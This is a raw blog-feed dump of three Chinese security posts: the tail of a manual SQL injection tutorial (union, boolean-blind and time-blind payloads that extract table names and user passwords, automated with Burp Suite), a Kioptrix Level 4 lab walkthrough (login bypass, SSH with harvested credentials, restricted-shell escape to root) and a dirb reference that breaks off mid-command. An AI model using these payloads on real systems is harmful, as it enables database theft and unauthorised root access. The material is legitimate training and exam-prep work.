table_name from information_schema.tables where table_schema=database() limit 0,1),5,1)=&#x27;a&#x27;),sleep(5),null) #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117165247.jpg" alt="Pasted-image-20250117165247"><br>Pasted-image-20250117165247</p><h2 id="获取表的字段"><a href="#获取表的字段" class="headerlink" title="获取表的字段"></a>获取表的字段</h2><blockquote><p>知道了有什么表之后还不足来查询表中的内容，还需要知道表有怎么字段(列)可以给我们查询，而表的字段信息存放在information_schema.columns表中。</p></blockquote><h3 id="常规形式-3"><a href="#常规形式-3" class="headerlink" title="常规形式"></a>常规形式</h3><ul><li>一样使用联合查询<code>union</code>使用显错点2来查询表中有什么字段。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117172802.jpg" alt="Pasted-image-20250117172802"><br>Pasted-image-20250117172802</p><h3 id="盲注形式-3"><a href="#盲注形式-3" class="headerlink" title="盲注形式"></a>盲注形式</h3><blockquote><p>首先要知道字段的长度为多少</p></blockquote><h4 id="布尔盲注-2"><a href="#布尔盲注-2" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><ul><li>猜字段的数量</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=8 #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117190725.jpg" alt="Pasted-image-20250117190725"><br>Pasted-image-20250117190725</p><ul><li>猜得字段长度</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and length(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1))=&#x27;7&#x27; #</span><br><span class="line">...</span><br><span class="line">1&#x27; and length(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),1))=&#x27;10&#x27; #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117180131.jpg" alt="Pasted-image-20250117180131"><br>Pasted-image-20250117180131</p><ul><li>一样只能通过猜字段的配合，这里示范猜第一个字段的字符</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1)=&#x27;u&#x27; #</span><br><span class="line">...</span><br><span class="line">1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),2,1)=&#x27;s&#x27; #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117174309.jpg" alt="Pasted-image-20250117174309"><br>Pasted-image-20250117174309</p><h4 id="时间盲注-2"><a href="#时间盲注-2" class="headerlink" title="时间盲注"></a>时间盲注</h4><ul><li>猜表的字段数量。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(((select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=8),sleep(5),null) #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117190922.jpg" alt="Pasted-image-20250117190922"><br>Pasted-image-20250117190922</p><ul><li>使用<code>if</code>函数猜得第一个字段的字符长度。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(length(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1))=7,sleep(5),null) #</span><br><span class="line">...</span><br><span class="line">1&#x27; and if(length(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),1))=7,sleep(5),null) #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/image.jpg" alt="image"><br>image</p><ul><li>再猜第一个字段的第一个字符是多少</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if((substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1)=&#x27;u&#x27;),sleep(5),null) #</span><br><span class="line">...</span><br><span class="line">1&#x27; and if((substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),2,1)=&#x27;u&#x27;),sleep(5),null) #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117185400.jpg" alt="Pasted-image-20250117185400"><br>Pasted-image-20250117185400</p><h2 id="获取表中的数据"><a href="#获取表中的数据" class="headerlink" title="获取表中的数据"></a>获取表中的数据</h2><blockquote><p>知道了表的字段后，就可以去查询表中的数据。</p></blockquote><h3 id="常规形式-4"><a href="#常规形式-4" class="headerlink" title="常规形式"></a>常规形式</h3><ul><li>配合联合查询获取表中指定字段的数据，注意原先表格的字段(列)数，联合查询的字段数量不能超过原先查询的字段数，不过可以使用<code>group_concat</code>合并多个字段。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(user_id,&#x27;,&#x27;,user,&#x27;,&#x27;,password) from users #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117193306.jpg" alt="Pasted-image-20250117193306"><br>Pasted-image-20250117193306</p><h3 id="盲注形式-4"><a href="#盲注形式-4" class="headerlink" title="盲注形式"></a>盲注形式</h3><blockquote><p>盲注要去查询表中的数据还是只能先猜一个字段的数据(行)数量，然后去猜第一个数据(行)的长度，再猜第一个数据第一个字符是什么。</p></blockquote><h4 id="布尔盲注-3"><a href="#布尔盲注-3" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><ul><li>先猜得数据的数量为多少。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and (select count(user_id) from users)=5 #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117195104.jpg" alt="Pasted-image-20250117195104"><br>Pasted-image-20250117195104</p><ul><li>再猜第一个数据的长度为多少。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and (select length((select user from users limit 0,1)))=5 #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117200538.jpg" alt="Pasted-image-20250117200538"><br>Pasted-image-20250117200538</p><ul><li>猜第一个字符是什么。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and (select substr((select user from users limit 0,1),1,1))=&#x27;a&#x27; #</span><br><span class="line">...</span><br><span class="line">1&#x27; and (select substr((select user from users limit 0,1),2,1))=&#x27;d&#x27; #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117200924.jpg" alt="Pasted-image-20250117200924"><br>Pasted-image-20250117200924</p><h4 id="时间盲注-3"><a href="#时间盲注-3" class="headerlink" title="时间盲注"></a>时间盲注</h4><ul><li>先猜测数据的数量为多少</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if((select count(user_id) from users)=5,sleep(3),null) #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117201730.jpg" alt="Pasted-image-20250117201730"><br>Pasted-image-20250117201730</p><ul><li>猜第一个数据(行)的长度为多少</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if((select length((select password from users limit 0,1)))=32,sleep(3),null) #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117202252.jpg" alt="Pasted-image-20250117202252"><br>Pasted-image-20250117202252</p><ul><li>猜测第一个数据(行)的第一个字符是什么。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if((select substr((select password from users limit 0,1),1,1))=5,sleep(3),null) #</span><br><span class="line">...</span><br><span class="line">1&#x27; and if((select substr((select password from users limit 0,1),32,1))=9,sleep(3),null) #</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117203211.jpg" alt="Pasted-image-20250117203211"><br>Pasted-image-20250117203211</p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><blockquote><p>编写这个注入步骤原意是为了准备OSCP考试的，在OSCP考试中是不允许使用sqlmap的所以手工注入必须要过关，但是如果考试的时候突然出现盲注这种就会很麻烦，一个个手敲代就太麻烦了，于是我就想到使用burpsuite的爆破来使用。</p></blockquote><h3 id="使用BurpSuite盲注"><a href="#使用BurpSuite盲注" class="headerlink" title="使用BurpSuite盲注"></a>使用BurpSuite盲注</h3><blockquote><p>具体思路如果盲注你是一个个敲会的话你肯定也发现了，每次获取到第一个字符正确后，去获取第二个字符其实也就是改个数字的事情，那么这个为什么不能用爆破形式的呢？哪怕社区版的bp都比我手敲的快(肯定)，这里引用一个新的函数<code>ascii</code>，他可以将输出的字符转为<code>ascii码</code>形式，大大减少了爆破的难度。因为你只需要跑1-100的数字就可以了，后面再对着改回字符就可以了。</p></blockquote><h4 id="Ascii码形式"><a href="#Ascii码形式" class="headerlink" title="Ascii码形式"></a>Ascii码形式</h4><ul><li>原本语句</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr((select user from users limit 0,1),1,1);</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117204439.jpg" alt="Pasted-image-20250117204439"><br>Pasted-image-20250117204439</p><ul><li>使用ascii函数后。其实就是将原本字符的查询语句用函数包起来就可以了。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select ascii(substr((select user from users limit 0,1),1,1));</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117204507.jpg" alt="Pasted-image-20250117204507"><br>Pasted-image-20250117204507</p><h4 id="使用BurpSuite爆破布尔盲注"><a href="#使用BurpSuite爆破布尔盲注" class="headerlink" title="使用BurpSuite爆破布尔盲注"></a>使用BurpSuite爆破布尔盲注</h4><ul><li>这里直接爆破数据库名字</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#只需要改猜得数值就可</span><br><span class="line">1&#x27; and ascii((select substr(database(), 1, 1))) = 1 #</span><br></pre></td></tr></table></figure><ul><li>抓取注入的请求包，发送的攻击器 ![]<img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117205708.jpg" alt="Pasted-image-20250117205708"></li><li>payload为需要改的那个数值，也就是那个<code>1</code>，然后ascii码的范围为1-100，设置好后直接开启攻击。 <img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117210520.jpg" alt="Pasted-image-20250117210520"></li><li>对于布尔类型的可以根据页面返回的内容，或者看响应包的长度来判断。 <img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117210630.jpg" alt="Pasted-image-20250117210630"></li></ul><h4 id="使用BurpSuite爆破时间盲注"><a href="#使用BurpSuite爆破时间盲注" class="headerlink" title="使用BurpSuite爆破时间盲注"></a>使用BurpSuite爆破时间盲注</h4><ul><li>也是爆破数据库名。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(ascii((select substr(database(), 1, 1)))= 1, sleep(5), false) #</span><br></pre></td></tr></table></figure><ul><li>抓取注入的请求包，发送到攻击器。 <img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117211021.jpg" alt="Pasted-image-20250117211021"></li><li>payload为需要改的那个数值，也就是那个<code>1</code>，然后ascii码的范围为1-100，设置好后直接开启攻击。 <img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117211349.jpg" alt="Pasted-image-20250117211349"></li><li>这里可以根据响应完成的时间来判断了。 <img src="https://imges.xenon.us.kg/20250117/Pasted-image-20250117211408.jpg" alt="Pasted-image-20250117211408"></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>SQL注入的步骤大概流程就是先找到能够传参的点，尝试闭合一下观察是否存在SQL报错，然后根据报错的内容来分辨是盲注还是常规注入。</p></blockquote><ul><li>常规形式 * 常规注入就先判断字段数量→然后判断显错点→获取当前数据库→获取数据库的表→表的字段→表的内容</li><li>盲注形式 * 盲注要先猜数据库的长度，猜数据库的名字→猜表的数量，长度，名字→表的字段数量，字段名字，数据</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kioptrix-Leve Four 综合靶机实战思路</title>
      <link href="/posts/78c75926.html"/>
      <url>/posts/78c75926.html</url>
      
        <content type="html"><![CDATA[<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>靶机名称</th><th>Kioptrix-Leve 1.4</th></tr></thead><tbody><tr><td>攻击机</td><td>192.168.109.129</td></tr><tr><td>靶机</td><td>192.168.109.128</td></tr></tbody></table><h2 id="前期信息收集"><a href="#前期信息收集" class="headerlink" title="前期信息收集"></a>前期信息收集</h2><h3 id="Nmap服务版本"><a href="#Nmap服务版本" class="headerlink" title="Nmap服务版本"></a>Nmap服务版本</h3><ul><li>只开放80和22端口。还有两个smb服务端口<br><img src="https://imges.xenon.us.kg/20250114/Pasted-image-20250112144100.jpg" alt="Pasted-image-20250112144100"></li></ul><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><ul><li>发现存在三个目录<code>images</code>、<code>john</code>、<code>robert</code>。<br><img src="https://imges.xenon.us.kg/20250114/Pasted-image-20250114102048.jpg" alt="Pasted-image-20250114102048"></li></ul><h3 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h3><p><img src="https://imges.xenon.us.kg/20250114/Pasted-image-20250112145630.jpg" alt="Pasted-image-20250112145630"></p><h3 id="Smb版本信息"><a href="#Smb版本信息" class="headerlink" title="Smb版本信息"></a>Smb版本信息</h3><ul><li>使用Nmap脚本确定版本信息<br><img src="https://imges.xenon.us.kg/20250114/Pasted-image-20250112153858.jpg" alt="Pasted-image-20250112153858"></li></ul><h3 id="信息整合"><a href="#信息整合" class="headerlink" title="信息整合"></a>信息整合</h3><table><thead><tr><th>端口号</th><th>服务名称</th><th>服务版本</th></tr></thead><tbody><tr><td>22</td><td>ssh</td><td>OpenSSH 4.7p1 Debian 8ubuntu1.2（协议2.0）</td></tr><tr><td>80</td><td>http</td><td>Apache httpd 2.2.8（Ubuntu） PHP&#x2F;5.2.4-2ubuntu5.6 with Suhosin-Patch</td></tr><tr><td>139</td><td>netbios-ssn</td><td>Samba 3.0.28a (unix)</td></tr><tr><td>445</td><td>netbios-ssn</td><td>Samba 3.0.28a (unix)</td></tr></tbody></table><h2 id="页面测试"><a href="#页面测试" class="headerlink" title="页面测试"></a>页面测试</h2><h3 id="根据信息查找POC"><a href="#根据信息查找POC" class="headerlink" title="根据信息查找POC"></a>根据信息查找POC</h3><h4 id="Apache版本漏洞"><a href="#Apache版本漏洞" class="headerlink" title="Apache版本漏洞"></a>Apache版本漏洞</h4><ul><li>暂未发现符合poc<br><img src="https://imges.xenon.us.kg/20250114/Pasted-image-20250112150642.jpg" alt="Pasted-image-20250112150642"></li></ul><h4 id="SSH服务"><a href="#SSH服务" class="headerlink" title="SSH服务"></a>SSH服务</h4><ul><li>暂未发现什么有价值<code>poc</code><br><img src="https://imges.xenon.us.kg/20250114/Pasted-image-20250112150854.jpg" alt="Pasted-image-20250112150854"></li></ul><h4 id="Smb服务"><a href="#Smb服务" class="headerlink" title="Smb服务"></a>Smb服务</h4><ul><li>暂未发现有用<br><img src="https://imges.xenon.us.kg/20250114/Pasted-image-20250112154046.jpg" alt="Pasted-image-20250112154046"></li></ul><h3 id="Web测试-80"><a href="#Web测试-80" class="headerlink" title="Web测试|80"></a>Web测试|80</h3><h4 id="目录收集"><a href="#目录收集" class="headerlink" title="目录收集"></a>目录收集</h4><h5 id="images站点图片目录"><a href="#images站点图片目录" class="headerlink" title="images站点图片目录"></a><code>images</code>站点图片目录</h5><ul><li>只有一个登录页面的图。<br><img src="https://imges.xenon.us.kg/20250114/Pasted-image-20250114102337.jpg" alt="Pasted-image-20250114102337"></li></ul><h5 id="john用户文件目录"><a href="#john用户文件目录" class="headerlink" title="john用户文件目录"></a><code>john</code>用户文件目录</h5><ul><li>有个<code>php</code>文件打开是会员管理面板。不过提示出错应该是没权限查看。<br><img src="https://imges.xenon.us.kg/20250114/Pasted-image-20250114102536.jpg" alt="Pasted-image-20250114102536"></li></ul><h5 id="robert用户文件目录"><a href="#robert用户文件目录" class="headerlink" title="robert用户文件目录"></a><code>robert</code>用户文件目录</h5><ul><li>一样是会员管理面板<br><img src="https://imges.xenon.us.kg/20250114/Pasted-image-20250114102807.jpg" alt="Pasted-image-20250114102807"></li></ul><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><ul><li>登录报错位置为<code>mypassword</code>合并的符号为<code>&#39;</code><br><img src="https://imges.xenon.us.kg/20250114/Pasted-image-20250114100914.jpg" alt="Pasted-image-20250114100914"></li><li>尝试万能密码登录，发现页面出错。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可正常登录</span></span><br><span class="line">1<span class="string">&#x27; or 1 = 1 #</span></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250114/Pasted-image-20250114101541.jpg" alt="Pasted-image-20250114101541"></p><ul><li>尝试使用之前发现的用户名，发现能正常显示页面，但是一样提示出错。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用一个存在的用户去尝试登录</span></span><br><span class="line">mypassword=1<span class="string">&#x27; and 1 = 1 #&amp;myusername=john</span></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250114/Pasted-image-20250114103035.jpg" alt="Pasted-image-20250114103035"></p><ul><li>语句一个小错误，正常判断用户名密码是通过<code>where</code>语句来判断用户<code>AND</code>密码是否在表中，原本使用了<code>AND</code>来连接，会导致有两个<code>ADN</code>来判断。而SQL的执行顺序来看，要保证用户名和密码都为真。改为<code>OR</code>一个为真则能登录</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mypassword=1<span class="string">&#x27; or 1 = 1 #&amp;myusername=john</span></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250114/Pasted-image-20250114124601.jpg" alt="Pasted-image-20250114124601"></p><ul><li>知道用户名密码尝试使用<code>SSH</code>登录看看，原本页面没有可用的功能点。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh john@192.168.109.128 -oHostKeyAlgorithms=+ssh-rsa</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250114/Pasted-image-20250114125516.jpg" alt="Pasted-image-20250114125516"></p><h5 id="已知信息"><a href="#已知信息" class="headerlink" title="已知信息"></a>已知信息</h5><table><thead><tr><th>username</th><th>password</th></tr></thead><tbody><tr><td>john</td><td>MyNameIsJohn</td></tr><tr><td>robert</td><td>ADGAdsafdfwt4gadfga&#x3D;&#x3D;</td></tr></tbody></table><h2 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h2><ul><li>回到登录进去的提示发现能使用的命令很少是个<code>rshell</code>，这时候就需要<code>Shell逃逸</code>来获取高权限的<code>shell</code>。<br><img src="https://imges.xenon.us.kg/20250114/Pasted-image-20250114143613.jpg" alt="Pasted-image-20250114143613"></li><li>能使用<code>echo</code>命令通过<code>echo</code>来获得完整的<code>shell</code></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> os.system(<span class="string">&quot;/bin/bash&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250114/Pasted-image-20250114143945.jpg" alt="Pasted-image-20250114143945"></p><ul><li>发现能使用全部命令？？<code>-u</code>指定用户，直接变成root用户了。<br><img src="https://imges.xenon.us.kg/20250114/Pasted-image-20250114144327.jpg" alt="Pasted-image-20250114144327"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vuInhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dirb | 目录枚举工具</title>
      <link href="/posts/b0f5cf4f.html"/>
      <url>/posts/b0f5cf4f.html</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p><strong><code>dirb</code></strong> 是 Kali Linux 中一个强大的目录和文件强制枚举工具，用于在 Web 渗透测试中查找隐藏的目录和文件。它通过字典攻击的方式枚举目标网站可能存在的目录和文件，还可以通过检测 HTTP 响应码、响应大小等方式判断哪些路径是有效的。</p></blockquote><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ul><li><code>Dirb</code>基于libcurl开发因此只能通过包管理或者<a href="https://salsa.debian.org/pkg-security-team/dirb">源代码</a>编译安装。windows中需要使用的话可以利用wsl来使用。</li></ul><h4 id="包管理器安装"><a href="#包管理器安装" class="headerlink" title="包管理器安装"></a>包管理器安装</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install dirb</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250113/Pasted-image-20250113160229.jpg" alt="Pasted-image-20250113160229"></p><h3 id="Dirb"><a href="#Dirb" class="headerlink" title="Dirb"></a>Dirb</h3><h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb &lt;目标URL&gt; [字典文件] [选项]</span><br></pre></td></tr></table></figure><h4 id="命令参数"><a href="#命令参数" class="headerlink" title="命令参数"></a>命令参数</h4><table><thead><tr><th>参数</th><th>说明</th><th>示例使用</th></tr></thead><tbody><tr><td><code>-a &lt;agent_string&gt;</code></td><td>自定义用户代理字符串 (User-Agent)，用于模拟特定浏览器或绕过简单的反爬虫措施</td><td><code>dirb http://example.com/ -a &quot;Mozilla/5.0&quot;</code></td></tr><tr><td><code>-b</code></td><td>使用原始路径，不做任何附加处理（不会自动加<code>/</code>）</td><td><code>dirb http://example.com/ -b</code></td></tr><tr><td><code>-c &lt;cookie_string&gt;</code></td><td>设置 HTTP 请求中的 Cookie 信息</td><td><code>dirb http://example.com/ -c &quot;sessionid=abcd1234&quot;</code></td></tr><tr><td><code>-E &lt;certificate&gt;</code></td><td>使用客户端证书进行请求，适用于 SSL&#x2F;TLS 认证</td><td><code>dirb https://example.com/ -E /path/to/cert.pem</code></td></tr><tr><td><code>-f</code></td><td>调优 404 错误的检测方式</td><td><code>dirb http://example.com/ -f</code></td></tr><tr><td><code>-H &lt;header_string&gt;</code></td><td>添加自定义的 HTTP 请求头，例如 Referer、Authorization</td><td><code>dirb http://example.com/ -H &quot;Referer: http://example.com/home&quot;</code></td></tr><tr><td><code>-i</code></td><td>进行大小写不敏感的路径搜索</td><td><code>dirb http://example.com/ -i</code></td></tr><tr><td><code>-l</code></td><td>显示响应中的 Location 头部，通常用于处理重定向</td><td><code>dirb http://example.com/ -l</code></td></tr><tr><td><code>-N &lt;nf_code&gt;</code></td><td>忽略指定的 HTTP 响应码，通常用于忽略 404（未找到）等不需要处理的响应</td><td><code>dirb http://example.com/ -N 404</code></td></tr><tr><td><code>-o &lt;output_file&gt;</code></td><td>将扫描结果输出到指定文件</td><td><code>dirb http://example.com/ -o results.txt</code></td></tr><tr><td><code>-p &lt;proxy[:port]&gt;</code></td><td>通过指定的代理服务器进行扫描，默认代理端口是 1080</td><td><code>dirb http://example.com/ -p 127.0.0.1:8080</code></td></tr><tr><td><code>-P &lt;proxy_username:proxy_password&gt;</code></td><td>配置代理服务器的认证信息</td><td><code>dirb http://example.com/ -P &quot;user:pass&quot;</code></td></tr><tr><td><code>-r</code></td><td>不进行递归扫描，只扫描指定的路径</td><td><code>dirb http://example.com/ -r</code></td></tr><tr><td><code>-R</code></td><td>交互式递归扫描，会询问是否扫描子目录</td><td><code>dirb http://example.com/ -R</code></td></tr><tr><td><code>-S</code></td><td>静默模式，不显示测试的路径，只显示结果</td><td><code>dirb http://example.com/ -S</code></td></tr><tr><td><code>-t</code></td><td>不自动在路径末尾添加<code>/</code>，适用于没有目录结构的情况</td><td><code>dirb http://example.com/ -t</code></td></tr><tr><td><code>-u &lt;username:password&gt;</code></td><td>使用 HTTP 基本认证（用户名：密码）进行身份验证</td><td><code>dirb http://example.com/ -u &quot;user:password&quot;</code></td></tr><tr><td><code>-v</code></td><td>显示 404 页面，默认情况下不显示 404 响应页面</td><td><code>dirb http://example.com/ -v</code></td></tr><tr><td><code>-w</code></td><td>扫描过程中不会因警告信息而停止</td><td><code>dirb http://example.com/ -w</code></td></tr><tr><td><code>-X &lt;extensions&gt;</code> &#x2F; <code>-x &lt;exts_file&gt;</code></td><td>在每个字典单词后面附加文件扩展名（如<code>.php</code>、<code>.html</code>）进行测试</td><td><code>dirb http://example.com/ -X .html,.php</code></td></tr><tr><td><code>-z &lt;millisecs&gt;</code></td><td>在请求之间添加毫秒级延迟，避免请求过快触发目标的防护机制</td><td><code>dirb http://example.com/ -z 500</code></td></tr></tbody></table><h4 id="使用站点"><a href="#使用站点" class="headerlink" title="使用站点"></a>使用站点</h4><ul><li>这里使用的为前面的Kioptrix-Level靶机<br><img src="https://imges.xenon.us.kg/20250113/Pasted-image-20250113162249.jpg" alt="Pasted-image-20250113162249"></li></ul><h4 id="默认扫描"><a href="#默认扫描" class="headerlink" title="默认扫描"></a>默认扫描</h4><ul><li>默认扫描会在指定的<code>url</code>的路径进行扫描，不指定字典则使用<code>common.txt</code>字典，并默认开启递归。可以带上<code>-w</code>无视警告扫描。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.109.131/</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250113/Pasted-image-20250113162138.jpg" alt="Pasted-image-20250113162138"></p><h4 id="扫描路径"><a href="#扫描路径" class="headerlink" title="扫描路径"></a>扫描路径</h4><ul><li>使用<code>-r</code>参数关闭递归扫描</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.109.131/ -r</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250113/Pasted-image-20250113165439.jpg" alt="Pasted-image-20250113165439"></p><h4 id="设置用户代理"><a href="#设置用户代理" class="headerlink" title="设置用户代理"></a>设置用户代理</h4><ul><li>使用<code>-a</code>参数来模拟用户来进行扫描。不过记得很少站点限制用户代理的。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.109.131/ -a <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250113/Pasted-image-20250113163010.jpg" alt="Pasted-image-20250113163010"></p><h4 id="自定义字典扫描"><a href="#自定义字典扫描" class="headerlink" title="自定义字典扫描"></a>自定义字典扫描</h4><ul><li><code>Dirb</code>的自带字典路径在<code>/usr/share/dirb/wordlists/</code>，当然也可以使用之前<code>Dirsearch</code>的字典或者自定义字典</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.109.131/ /usr/share/dirb/wordlists/small.txt</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250113/Pasted-image-20250113163438.jpg" alt="Pasted-image-20250113163438"></p><h4 id="扫描指定扩展"><a href="#扫描指定扩展" class="headerlink" title="扫描指定扩展"></a>扫描指定扩展</h4><ul><li>可以对站点的环境信息进行信息收集，来扫描指定的环境文件或者一些备份和敏感文件。(在指定的字典后面添加扩展名)多个扩展名用<code>,</code>分隔。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.109.131/gallery/ -X .sql</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250113/Pasted-image-20250113164116.jpg" alt="Pasted-image-20250113164116"></p><h4 id="使用代理扫描"><a href="#使用代理扫描" class="headerlink" title="使用代理扫描"></a>使用代理扫描</h4><ul><li>代理方式很多，不提供方法，举个例子。使用的为<code>http</code>代理</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb https://www.xenoecho.us.kg/ -p 127.0.0.1:10101</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250113/Pasted-image-20250113164931.jpg" alt="Pasted-image-20250113164931"></p><h4 id="排除状态码"><a href="#排除状态码" class="headerlink" title="排除状态码"></a>排除状态码</h4><ul><li><code>-f</code>优化404检错方式，<code>-N</code>排除指定状态码。因为404是默认排除的所以排除200，排除多个可用多个<code>-N</code></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.109.131/ -f -N 200</span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20250113/Pasted-image-20250113170252.jpg" alt="Pasted-image-20250113170252"></p><h4 id="自定义请求头"><a href="#自定义请求头" class="headerlink" title="自定义请求头"></a>自定义请求头</h4><ul><li>使用<code>-H</code>参数来设置多个请求头，设置多个可用多个<code>-H</code></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.109.131/ -H <span class="string">&quot;X-Forwarded-For: 